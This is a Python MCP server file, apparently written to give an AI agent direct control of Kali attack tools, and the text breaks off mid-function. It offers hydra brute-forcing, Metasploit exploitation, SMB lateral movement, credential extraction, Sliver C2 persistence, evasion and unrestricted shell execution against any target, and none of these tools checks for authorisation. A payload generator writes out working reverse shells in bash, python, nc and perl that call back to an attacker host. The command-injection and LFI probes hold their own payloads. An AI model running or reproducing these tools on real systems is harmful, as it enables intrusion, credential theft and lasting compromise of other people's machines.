#!/usr/bin/env python3
"""
Kali MCP Tactical Server - Optimized for Advanced Penetration Testing
Enhanced reliability, better error handling, and advanced exploitation capabilities
"""

import asyncio
import subprocess
import json
import logging
import shlex
import tempfile
import os
import re
import datetime
import xml.etree.ElementTree as ET
import hashlib
import base64
import urllib.parse
from typing import Dict, Any, Optional, List, Tuple
from functools import wraps
from dataclasses import dataclass, asdict
from enum import Enum

from fastmcp import FastMCP

# ============================================================================
# CONFIGURATION
# ============================================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TOOL_LOG_DIR = os.path.join(BASE_DIR, "tool_logs")
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")

os.makedirs(TOOL_LOG_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(PAYLOADS_DIR, exist_ok=True)

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(BASE_DIR, "kali_mcp_server.log")),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger(__name__)

# Global session
CURRENT_SESSION_ID = None

# Initialize components
from src.core.async_executor import AsyncExecutor
from src.core.task_manager import TaskManager
from src.core.database import DatabaseManager
from src.core.process_manager import ProcessManager
from src.modules.network_recon import NetworkRecon
from src.modules.vulnerability_scanner import VulnerabilityScanner
from src.tools.distributed_engine import DistributedEngine
from src.core.triage import TriageEngine
from src.tools.document_analyzer import DocumentAnalyzer
from src.tools.database_expert import DatabaseExpert
from src.tools.reverse_engineer import ReverseEngineer
from src.tools.osint_hunter import OSINTHunter
from src.tools.wireless_expert import WirelessExpert
from src.tools.post_exploit import PostExploit
from src.tools.evasion_engine import EvasionEngine
from src.tools.origin_hunter import OriginHunter
from src.tools.phishing_exploit import PhishingExploit
from src.tools.osint_analyzer import OSINTAnalyzer
from src.tools.endpoint_tester import EndpointTester

executor = AsyncExecutor()
db = DatabaseManager()
tasks = TaskManager()
process_mgr = ProcessManager()

# Cleanup zombies at startup
process_mgr.cleanup_zombies()

# Modules
recon = NetworkRecon()
vuln = VulnerabilityScanner()
swarm = DistributedEngine(executor)

# Advanced Tools
doc_analyzer = DocumentAnalyzer(executor)
db_expert = DatabaseExpert()
reverse_engineer = ReverseEngineer(executor)
osint_hunter = OSINTHunter(executor)
wireless_expert = WirelessExpert(executor)
post_exploit = PostExploit(executor)
evasion = EvasionEngine(executor, swarm)
origin_hunter = OriginHunter(executor)
phishing_exploit = PhishingExploit(executor)
osint_analyzer = OSINTAnalyzer(executor)
endpoint_tester = EndpointTester(executor)

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def generate_timestamp() -> str:
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

def sanitize_filename(name: str) -> str:
    """Sanitize string for use as filename"""
    return re.sub(r'[^\w\-.]', '_', name.replace('://', '_').replace('/', '_'))[:100]

def run_command_advanced(
    command: List[str],
    timeout: int = 600,
    env: Optional[Dict] = None,
    cwd: Optional[str] = None,
    shell: bool = False,
    capture_realtime: bool = False
) -> Dict[str, Any]:
    """
    Advanced command execution with better error handling and timeout management
    """
    start_time = datetime.datetime.now()
    
    try:
        logger.info(f"Executing: {' '.join(command) if isinstance(command, list) else command}")
        
        process_env = os.environ.copy()
        if env:
            process_env.update(env)
        
        if shell and isinstance(command, list):
            command = ' '.join(command)
        
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
            env=process_env,
            cwd=cwd,
            shell=shell
        )
        
        execution_time = (datetime.datetime.now() - start_time).total_seconds()
        
        return {
            "stdout": result.stdout.strip(),
            "stderr": result.stderr.strip(),
            "return_code": result.returncode,
            "execution_time": execution_time,
            "success": result.returncode == 0,
            "command": command if isinstance(command, str) else ' '.join(command)
        }
        
    except subprocess.TimeoutExpired as e:
        logger.error(f"Command timed out after {timeout}s")
        return {
            "stdout": e.stdout.decode() if e.stdout else "",
            "stderr": f"TIMEOUT: Command exceeded {timeout} seconds",
            "return_code": -1,
            "execution_time": timeout,
            "success": False,
            "command": command if isinstance(command, str) else ' '.join(command)
        }
        
    except FileNotFoundError:
        logger.error(f"Command not found: {command[0] if isinstance(command, list) else command.split()[0]}")
        return {
            "stdout": "",
            "stderr": f"Command not found. Ensure the tool is installed.",
            "return_code": -1,
            "execution_time": 0,
            "success": False,
            "command": command if isinstance(command, str) else ' '.join(command)
        }
        
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        return {
            "stdout": "",
            "stderr": str(e),
            "return_code": -1,
            "execution_time": 0,
            "success": False,
            "command": command if isinstance(command, str) else ' '.join(command)
        }

# ============================================================================
# TOOL DEFINITIONS
# ============================================================================

mcp = FastMCP("kali-tactical-elite")

@mcp.tool()
async def tactical_recon(target: str) -> str:
    """Reconnaissance complète et plan d'attaque"""
    try:
        data = await recon.quick_recon(target)
        plan = TriageEngine.generate_plan(data)
        
        # Auto-select strategy based on defenses
        vuln_scanner = VulnerabilityScanner()
        strategy = await vuln_scanner.auto_select_strategy(target, data)
        
        result = {
            "recon": data, 
            "defense_analysis": strategy,
            "next_steps": plan
        }
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def distributed_assault(target: str) -> str:
    """Attaque via pool d'IP (Swarm mode)"""
    try:
        task_id = tasks.create_task(target, "swarm")
        # ✅ CORRECTION: Utiliser tasks.start_background_task() au lieu de asyncio.create_task()
        tasks.start_background_task(
            task_id,
            swarm.launch_swarm,
            target,
            "recon"
        )
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "target": target,
            "message": f"Attaque distribuée lancée. ID: {task_id}"
        })
    except Exception as e:
        return json.dumps({"error": str(e)})

@mcp.tool()
async def check_task(task_id: str) -> str:
    """Vérifier le statut d'un scan long"""
    try:
        status = tasks.get_task_status(task_id)
        return json.dumps(status, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def list_tasks(status_filter: Optional[str] = None, tool_filter: Optional[str] = None, limit: int = 50) -> str:
    """Lister tous les tâches en arrière-plan avec filtres optionnels"""
    try:
        from src.core.task_manager import TaskStatus
        
        status_enum = None
        if status_filter:
            try:
                status_enum = TaskStatus[status_filter.upper()]
            except KeyError:
                return json.dumps({
                    "error": f"Invalid status. Choose from: {[s.value for s in TaskStatus]}"
                })
        
        task_list = tasks.list_tasks(
            status_filter=status_enum,
            tool_filter=tool_filter
        )
        
        return json.dumps({
            "total": len(task_list),
            "tasks": task_list[:limit]
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def cancel_task(task_id: str) -> str:
    """Annuler une tâche en cours ou en attente"""
    try:
        success = tasks.cancel_task(task_id)
        
        return json.dumps({
            "task_id": task_id,
            "cancelled": success,
            "message": "Task cancelled successfully" if success else "Task not found or already finished"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def locate_origin(domain: str) -> str:
    """
    Démasquer le serveur réel derrière Cloudflare
    Trouve l'IP réelle en exploitant les fuites DNS et les enregistrements non protégés
    """
    try:
        result = await origin_hunter.locate_origin(domain)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({
            "error": str(e),
            "domain": domain,
            "message": "Failed to locate origin server"
        }, indent=2)

@mcp.tool()
async def get_task_stats() -> str:
    """Obtenir les statistiques sur toutes les tâches"""
    try:
        stats = tasks.get_stats()
        return json.dumps(stats, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def find_origin_ip(target: str, method: str = "auto") -> str:
    """
    Trouver l'IP réelle d'un site derrière un CDN/proxy (Cloudflare, etc.)
    
    Méthodes disponibles:
    - auto: Essayer toutes les méthodes
    - dns: Énumération DNS et zone transfer
    - http: Analyse des headers HTTP
    - ssl: Analyse des certificats SSL
    - whois: Recherche WHOIS
    - shodan: Recherche Shodan (nécessite API key)
    - censys: Recherche Censys (nécessite API key)
    """
    try:
        results = {
            "target": target,
            "method": method,
            "findings": [],
            "original_ip": None,
            "confidence": 0
        }
        
        # Méthode 1: DNS Enumeration
        if method in ["auto", "dns"]:
            try:
                cmd = ["dig", "+short", target]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.stdout:
                    ips = [line.strip() for line in result.stdout.split('\n') if line.strip() and re.match(r'^\d+\.\d+\.\d+\.\d+$', line.strip())]
                    if ips:
                        results["findings"].append({
                            "method": "DNS Resolution",
                            "ips": ips,
                            "confidence": 0.6
                        })
            except Exception as e:
                logger.warning(f"DNS enumeration failed: {e}")
        
        # Méthode 2: HTTP Headers Analysis
        if method in ["auto", "http"]:
            try:
                cmd = ["curl", "-I", "-s", f"http://{target}"]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                headers = result.stdout
                
                # Chercher des indices dans les headers
                if "Server:" in headers:
                    results["findings"].append({
                        "method": "HTTP Headers",
                        "data": headers[:500],
                        "confidence": 0.3
                    })
            except Exception as e:
                logger.warning(f"HTTP analysis failed: {e}")
        
        # Méthode 3: SSL Certificate Analysis
        if method in ["auto", "ssl"]:
            try:
                cmd = ["openssl", "s_client", "-connect", f"{target}:443", "-servername", target]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10, input="Q\n")
                cert_data = result.stdout
                
                # Extraire les SANs (Subject Alternative Names)
                san_match = re.search(r'Subject Alternative Name: (.*)', cert_data)
                if san_match:
                    results["findings"].append({
                        "method": "SSL Certificate SAN",
                        "data": san_match.group(1),
                        "confidence": 0.7
                    })
            except Exception as e:
                logger.warning(f"SSL analysis failed: {e}")
        
        # Méthode 4: WHOIS Lookup
        if method in ["auto", "whois"]:
            try:
                cmd = ["whois", target]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                whois_data = result.stdout
                
                # Chercher les IPs dans WHOIS
                ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', whois_data)
                if ips:
                    results["findings"].append({
                        "method": "WHOIS Lookup",
                        "ips": list(set(ips)),
                        "confidence": 0.5
                    })
            except Exception as e:
                logger.warning(f"WHOIS lookup failed: {e}")
        
        # Méthode 5: Subdomain Enumeration (peut révéler l'IP réelle)
        if method in ["auto"]:
            try:
                cmd = ["subfinder", "-d", target, "-silent"]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                subdomains = result.stdout.strip().split('\n')
                
                if subdomains:
                    results["findings"].append({
                        "method": "Subdomain Enumeration",
                        "subdomains": subdomains[:10],
                        "note": "Certains subdomains peuvent pointer vers l'IP réelle",
                        "confidence": 0.4
                    })
            except Exception as e:
                logger.warning(f"Subdomain enumeration failed: {e}")
        
        # Déterminer la confiance globale
        if results["findings"]:
            results["confidence"] = max([f.get("confidence", 0) for f in results["findings"]])
        
        results["status"] = "success" if results["findings"] else "no_findings"
        
        return json.dumps(results, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e), "target": target}, indent=2)

@mcp.tool()
async def analyze_document(file_path: str) -> str:
    """Analyser un document pour métadonnées et menaces"""
    try:
        data = await doc_analyzer.analyze_document(file_path)
        return json.dumps(data, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def crack_hashes(hashes: List[str]) -> str:
    """Cracker des hashes de mot de passe"""
    try:
        data = await db_expert.crack_hashes(hashes)
        return json.dumps(data, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def reverse_engineer_binary(file_path: str) -> str:
    """Analyser un fichier binaire"""
    try:
        data = await reverse_engineer.analyze_binary(file_path)
        return json.dumps(data, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def check_site_legitimacy(domain: str) -> str:
    """Vérifier la légitimité d'un site web"""
    try:
        data = await osint_hunter.check_legitimacy(domain)
        return json.dumps(data, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def scan_wifi_networks(interface: str) -> str:
    """Scanner les réseaux WiFi à proximité"""
    try:
        data = await wireless_expert.scan_wifi_networks(interface)
        return json.dumps(data, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def lateral_movement(target_range: str, user: str, password: str) -> str:
    """Mouvement latéral SMB via NetExec"""
    try:
        result = await post_exploit.smb_lateral_movement(target_range, user, password)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def ghost_mode_toggle(enable: bool) -> str:
    """Activer/Désactiver l'évasion Ghost Mode"""
    try:
        result = await evasion.toggle_ghost_mode(enable)
        return result
    except Exception as e:
        return f"Error: {str(e)}"

@mcp.tool()
async def deploy_persistence(target_ip: str, user: str, password: str, lhost: str) -> str:
    """Déployer un implant Sliver C2"""
    try:
        result = await post_exploit.deploy_persistence(target_ip, user, password, lhost)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def extract_credentials(target_ip: str, user: str, password: str) -> str:
    """Extraire les credentials d'une machine compromise"""
    try:
        result = await post_exploit.extract_credentials(target_ip, user, password)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def privilege_escalation(target_ip: str, user: str, password: str) -> str:
    """Tenter une élévation de privilèges"""
    try:
        result = await post_exploit.privilege_escalation(target_ip, user, password)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def arp_scan(target: str, interface: Optional[str] = None) -> str:
    """Scan réseau ARP pour découvrir les hôtes actifs"""
    try:
        cmd = ["arp-scan", target]
        if interface:
            cmd.extend(["-I", interface])
        
        result = run_command_advanced(cmd, timeout=300)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def command_injection_test(url: str, param: str, method: str = "GET", data: Optional[str] = None, custom_payloads: Optional[List[str]] = None, timeout: int = 300) -> str:
    """Test d'injection de commandes avec des payloads personnalisés"""
    try:
        # Use existing command injection testing logic
        payloads = custom_payloads or [
            "; whoami", "| whoami", "&& whoami", "`whoami`", "$(whoami)"
        ]
        
        results = []
        for payload in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            if method.upper() == "POST":
                cmd = ["curl", "-X", "POST", "-d", f"{param}={payload}", url]
            else:
                cmd = ["curl", test_url]
            
            result = run_command_advanced(cmd, timeout=timeout)
            results.append({
                "payload": payload,
                "response": result["stdout"][:500],
                "execution_time": result["execution_time"]
            })
        
        return json.dumps({
            "url": url,
            "parameter": param,
            "method": method,
            "payloads_tested": len(payloads),
            "results": results
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def dns_recon(domain: str, record_types: List[str] = ["A", "MX", "NS", "TXT"], timeout: int = 300) -> str:
    """Reconnaissance DNS avancée"""
    try:
        results = {}
        for record_type in record_types:
            cmd = ["dig", record_type, domain, "+short"]
            result = run_command_advanced(cmd, timeout=timeout)
            results[record_type] = result["stdout"].split("\n") if result["stdout"] else []
        
        return json.dumps(results, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def enum4linux_scan(target: str, options: str = "-a", timeout: int = 600) -> str:
    """Enumération Windows/Linux avec enum4linux"""
    try:
        cmd = ["enum4linux"] + options.split() + [target]
        result = run_command_advanced(cmd, timeout=timeout)
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def execute_command(command: str, timeout: int = 600, working_dir: Optional[str] = None) -> str:
    """Exécuter une commande shell arbitraire"""
    try:
        result = run_command_advanced(
            command,
            timeout=timeout,
            cwd=working_dir,
            shell=True
        )
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def ffuf_fuzz(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", extensions: Optional[str] = None, threads: int = 40, timeout: int = 900) -> str:
    """Fuzzing web avec ffuf - Exécution asynchrone"""
    try:
        # Create a background task
        task_id = tasks.create_task(url, "ffuf")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_ffuf_background,
            task_id, url, wordlist, extensions, threads, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"FFUF fuzzing lancé en arrière-plan. Utilisez check_task('{task_id}') dans 5-15 minutes.",
            "estimated_time": "5-15 minutes",
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


async def _run_ffuf_background(task_id: str, url: str, wordlist: str, extensions: Optional[str], threads: int, timeout: int):
    """Exécution en arrière-plan de FFUF"""
    try:
        cmd = ["ffuf", "-u", url, "-w", wordlist, "-t", str(threads), "-v"]
        if extensions:
            cmd.extend(["-e", extensions])
        
        # Convert command to string
        cmd_str = ' '.join(cmd)
        
        # Run the command with our improved executor
        result = await executor.run_command(cmd_str, timeout=timeout)
        
        # Format result
        formatted_result = {
            "stdout": result[0],
            "stderr": result[1],
            "return_code": result[2],
            "command": cmd_str
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def get_payloads(payload_type: str = "reverse_shell", lhost: str = "127.0.0.1", lport: int = 4444) -> str:
    """Générer des payloads pour différents types d'attaques"""
    try:
        if payload_type == "reverse_shell":
            payloads = {
                "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "nc": f"nc {lhost} {lport} -e /bin/sh",
                "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
            }
        else:
            payloads = {"error": f"Payload type '{payload_type}' not supported"}
        
        return json.dumps(payloads, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def gobuster_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", extensions: Optional[str] = None, status_codes: str = "200,204,301,302,307,401,403", timeout: int = 900) -> str:
    """Scan de répertoires avec gobuster - Exécution asynchrone"""
    try:
        # Create a background task
        task_id = tasks.create_task(url, "gobuster")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_gobuster_background,
            task_id, url, wordlist, extensions, status_codes, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"Gobuster scan lancé en arrière-plan. Utilisez check_task('{task_id}') dans 5-15 minutes.",
            "estimated_time": "5-15 minutes",
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


async def _run_gobuster_background(task_id: str, url: str, wordlist: str, extensions: Optional[str], status_codes: str, timeout: int):
    """Exécution en arrière-plan de Gobuster"""
    try:
        cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-s", status_codes]
        if extensions:
            cmd.extend(["-x", extensions])
        
        # Convert command to string
        cmd_str = ' '.join(cmd)
        
        # Run the command with our improved executor
        result = await executor.run_command(cmd_str, timeout=timeout)
        
        # Format result
        formatted_result = {
            "stdout": result[0],
            "stderr": result[1],
            "return_code": result[2],
            "command": cmd_str
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def hydra_attack(target: str, service: str, username: Optional[str] = None, userlist: Optional[str] = None, password: Optional[str] = None, passlist: Optional[str] = "/usr/share/wordlists/rockyou.txt", port: Optional[int] = None, threads: int = 16, timeout: int = 1800) -> str:
    """Attaque par force brute avec Hydra - Exécution asynchrone"""
    try:
        # Create a background task
        task_id = tasks.create_task(target, "hydra")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_hydra_background,
            task_id, target, service, username, userlist, password, passlist, port, threads, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"Hydra attack lancé en arrière-plan. Utilisez check_task('{task_id}') dans 10-30 minutes.",
            "estimated_time": "10-30 minutes",
            "service": service,
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


async def _run_hydra_background(task_id: str, target: str, service: str, username: Optional[str], userlist: Optional[str], password: Optional[str], passlist: Optional[str], port: Optional[int], threads: int, timeout: int):
    """Exécution en arrière-plan de Hydra"""
    try:
        cmd = ["hydra"]
        
        if username:
            cmd.extend(["-l", username])
        elif userlist:
            cmd.extend(["-L", userlist])
        
        if password:
            cmd.extend(["-p", password])
        elif passlist:
            cmd.extend(["-P", passlist])
        
        cmd.extend(["-t", str(threads)])
        
        if port:
            cmd.extend(["-s", str(port)])
        
        cmd.extend([target, service])
        
        # Convert command to string
        cmd_str = ' '.join(cmd)
        
        # Run the command with our improved executor
        result = await executor.run_command(cmd_str, timeout=timeout)
        
        # Format result
        formatted_result = {
            "stdout": result[0],
            "stderr": result[1],
            "return_code": result[2],
            "command": cmd_str
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def john_crack(hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt", format: Optional[str] = None, timeout: int = 3600) -> str:
    """Cassage de mots de passe avec John the Ripper - Exécution asynchrone"""
    try:
        # Create a background task
        task_id = tasks.create_task(hash_file, "john")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_john_background,
            task_id, hash_file, wordlist, format, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"John the Ripper lancé en arrière-plan. Utilisez check_task('{task_id}') dans 10-60 minutes.",
            "estimated_time": "10-60 minutes",
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


async def _run_john_background(task_id: str, hash_file: str, wordlist: str, format: Optional[str], timeout: int):
    """Exécution en arrière-plan de John the Ripper"""
    try:
        cmd = ["john", hash_file, f"--wordlist={wordlist}"]
        if format:
            cmd.append(f"--format={format}")
        
        # Convert command to string
        cmd_str = ' '.join(cmd)
        
        # Run the command with our improved executor
        result = await executor.run_command(cmd_str, timeout=timeout)
        
        # Show cracked passwords
        show_cmd = ["john", "--show", hash_file]
        if format:
            show_cmd.append(f"--format={format}")
        
        # Convert show command to string
        show_cmd_str = ' '.join(show_cmd)
        
        # Run the show command
        show_result = await executor.run_command(show_cmd_str, timeout=60)
        
        # Format result
        formatted_result = {
            "cracking_result": {
                "stdout": result[0],
                "stderr": result[1],
                "return_code": result[2],
                "command": cmd_str
            },
            "cracked_passwords": {
                "stdout": show_result[0],
                "stderr": show_result[1],
                "return_code": show_result[2],
                "command": show_cmd_str
            }
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def lfi_scan(url: str, param: str, custom_payloads: Optional[List[str]] = None, timeout: int = 300) -> str:
    """Test d'inclusion de fichiers locaux (LFI)"""
    try:
        payloads = custom_payloads or [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        ]
        
        results = []
        for payload in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            cmd = ["curl", "-s", test_url]
            result = run_command_advanced(cmd, timeout=timeout)
            
            # Check for LFI indicators
            vulnerable = False
            if "root:" in result["stdout"] and ":/bin/" in result["stdout"]:
                vulnerable = True
            
            results.append({
                "payload": payload,
                "vulnerable": vulnerable,
                "response_preview": result["stdout"][:200]
            })
        
        return json.dumps({
            "url": url,
            "parameter": param,
            "payloads_tested": len(payloads),
            "results": results
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)

@mcp.tool()
async def metasploit_exploit(target: str, module: str, payload: Optional[str] = None, options: Optional[Dict[str, str]] = None, timeout: int = 1800) -> str:
    """Exécution d'exploits Metasploit - Exécution asynchrone"""
    try:
        # Create a background task
        task_id = tasks.create_task(target, "metasploit")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_metasploit_background,
            task_id, target, module, payload, options, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"Metasploit exploit lancé en arrière-plan. Utilisez check_task('{task_id}') dans 10-30 minutes.",
            "estimated_time": "10-30 minutes",
            "module": module,
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


async def _run_metasploit_background(task_id: str, target: str, module: str, payload: Optional[str], options: Optional[Dict[str, str]], timeout: int):
    """Exécution en arrière-plan de Metasploit"""
    try:
        # Create a temporary resource file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(f"use {module}\n")
            f.write(f"set RHOSTS {target}\n")
            
            if payload:
                f.write(f"set PAYLOAD {payload}\n")
            
            if options:
                for key, value in options.items():
                    f.write(f"set {key} {value}\n")
            
            f.write("exploit\n")
            f.write("exit\n")
            rc_file = f.name
        
        cmd = ["msfconsole", "-r", rc_file]
        
        # Convert command to string
        cmd_str = ' '.join(cmd)
        
        # Run the command with our improved executor
        result = await executor.run_command(cmd_str, timeout=timeout)
        
        # Clean up
        os.unlink(rc_file)
        
        # Format result
        formatted_result = {
            "stdout": result[0],
            "stderr": result[1],
            "return_code": result[2],
            "command": cmd_str
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def nikto_scan(target: str, port: int = 80, timeout: int = 1800) -> str:
    """Audit de sécurité web avec Nikto - Exécution asynchrone"""
    try:
        # Create a background task
        task_id = tasks.create_task(target, "nikto")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_nikto_background,
            task_id, target, port, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"Nikto scan lancé en arrière-plan. Utilisez check_task('{task_id}') dans 10-30 minutes.",
            "estimated_time": "10-30 minutes",
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours"
        }, indent=2)
    except Exception as e:
        return json.dumps({"error": str(e)}, indent=2)


async def _run_nikto_background(task_id: str, target: str, port: int, timeout: int):
    """Exécution en arrière-plan de Nikto"""
    try:
        cmd = ["nikto", "-h", target, "-p", str(port)]
        
        # Convert command to string
        cmd_str = ' '.join(cmd)
        
        # Run the command with our improved executor
        result = await executor.run_command(cmd_str, timeout=timeout)
        
        # Format result
        formatted_result = {
            "stdout": result[0],
            "stderr": result[1],
            "return_code": result[2],
            "command": cmd_str
        }
        
        # Store result in task manager
        tasks.tasks[task_id].complete(json.dumps(formatted_result, indent=2))
        
    except Exception as e:
        error_result = {
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat()
        }
        if task_id in tasks.tasks:
            tasks.tasks[task_id].fail(json.dumps(error_result, indent=2))

@mcp.tool()
async def nmap_scan(target: str, scan_type: str = "comprehensive", ports: Optional[str] = None, intensity: str = "medium", timeout: int = 900) -> str:
    """⚠️ LEGACY TOOL - Use tactical_recon instead for better results - Exécution asynchrone"""
    try:
        # Warning: Recommend using tactical tools
        warning_msg = "⚠️ RECOMMENDATION: Use 'tactical_recon' for comprehensive reconnaissance with automated triage"
        
        # Create a background task
        task_id = tasks.create_task(target, "nmap")
        
        # Launch in background using TaskManager
        tasks.start_background_task(
            task_id, 
            _run_nmap_background,
            task_id, target, scan_type, ports, intensity, timeout
        )
        
        return json.dumps({
            "status": "background_started",
            "task_id": task_id,
            "message": f"Nmap scan lancé en arrière-plan. Utilisez check_task('{task_id}') dans 5-15 minutes.",
            "estimated_time": "5-15 minutes",
            "scan_type": scan_type,
            "warning": "⚠️ Ne relancez pas cette commande tant que la tâche est en cours. " + warning_msg
        }, indent=2)
    except Exception as e:
